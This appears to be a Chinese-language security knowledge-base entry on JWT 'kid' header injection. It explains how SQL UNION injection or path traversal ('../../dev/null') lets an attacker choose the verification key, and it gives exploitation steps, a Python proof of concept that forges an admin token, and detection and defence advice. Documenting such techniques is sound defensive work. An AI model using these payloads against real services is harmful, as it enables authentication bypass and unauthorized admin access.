---
id: web-generic-jwt-kid-injection
title: JWT kid 头注入：SQL UNION 控制验签密钥
type: scenario
domain: web
path: web/generic/jwt
technique: jwt-kid-injection
aliases:
- KID 注入
- kid SQL 注入
- JWT 密钥 ID 注入
- kid 路径穿越
- JWT header 注入
tags:
- jwt
- kid
- sql-injection
- header-injection
- authentication-bypass
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
verification:
  verified_by: verifier-V8
  verified_at: '2026-11-05T00:37:26+08:00'
  notes: 已对照原文与图 12 核对：kid 直接拼接 SQL、' UNION SELECT injected-secret -- 使查询返回可控密钥、用该密钥签 HS256 后通过，以及 ../dev/null 路径穿越变体，均与原文一致；PoC 未在本机执行。
---

## 一句话结论

服务端把 JWT Header 中的 `kid` 直接拼进 SQL 查询（或文件路径）来取验证密钥时，攻击者用 UNION 注入让查询返回自己指定的密钥字符串，再用该密钥签名，即可伪造任意 JWT。

## 原理

- `kid`（Key ID）是 JWT Header 的可选字段，用于告诉服务端使用哪个密钥验证签名。它来自未验证的 Header，属于攻击者可控输入。
- 漏洞代码：`query = f"SELECT key_value FROM jwt_keys WHERE kid = '{kid}'"`，再用查询结果作为 `jwt.decode` 的密钥。存在 SQL 注入。
- 攻击者构造 `kid = ' UNION SELECT 'injected-secret' --`，SQL 变为 `WHERE kid = '' UNION SELECT 'injected-secret' --'`；第一段返回空，UNION 段返回 `injected-secret`。
- 服务端拿 `injected-secret` 验签，而攻击者正是用这个值对篡改后的 Payload 做 HS256 签名，验证通过。
- 同源风险还包括路径穿越：若 `key = open(f"keys/{kid}.pem").read()`，可用 `../../dev/null` 等让密钥为空或读取可控文件。

## 触发条件

- JWT 验证流程使用 Header `kid` 选择密钥。
- `kid` 被拼接进 SQL、文件路径、命令或模板，未做参数化/白名单。
- 攻击者能控制 JWT Header（任意客户端都可以）。

## 利用步骤

1. 解码一个合法 JWT，确认 Header 含 `kid`。
2. 探测 `kid` 是否影响密钥选择：改为不存在的值，观察报错（Key not found/SQL 错误/文件不存在）。
3. 构造 SQL 注入 payload，使查询返回固定密钥字符串。
4. 用该字符串作为 HMAC 密钥签发篡改后的 Payload，`kid` 设为同一注入串。
5. 发送请求，确认管理员身份。

## PoC

```python
import jwt, requests

INJECTED_KEY = "injected-secret"
kid_payload = f"' UNION SELECT '{INJECTED_KEY}' --"

token = jwt.encode(
    {"sub": "admin", "role": "admin"},
    INJECTED_KEY,
    algorithm="HS256",
    headers={"kid": kid_payload},
)

r = requests.get("http://target/api/admin",
                 headers={"Authorization": f"Bearer {token}"})
print(r.status_code, r.text)
```

服务端实际执行：

```sql
SELECT key_value FROM jwt_keys WHERE kid = '' UNION SELECT 'injected-secret' --'
```

路径穿越变体：

```text
kid = ../../dev/null
# 服务端读到空字符串，攻击者用空字符串作为 HMAC 密钥签名
```

## 变体与关联

- 变体：`kid` 命令注入（若拼进 shell）；`kid` 模板注入；`kid` 指向可控上传文件/远程 URL；不同数据库的注释符与引号闭合方式需调整。
- 关联：[[web-generic-jwt-jku-header-hijack]]（另一种通过 Header 控制公钥来源）；[[web-generic-jwt-alg-none-bypass]]（无需密钥的直接绕过）。
- 边界：若 `kid` 使用参数化查询、白名单映射或固定密钥表，本手法不成立。

## 检测与防御

- 检测：`kid` 含单引号、`UNION`、`--`、`../` 等注入特征；大量不存在的 kid 探测；JWT Header 异常字段。
- 防御：`kid` 只做白名单映射（如 `{"key1": key1}`），不拼接查询/路径；数据库使用参数化查询；密钥文件路径用 `basename()` 限制；验证前拒绝含特殊字符的 kid。
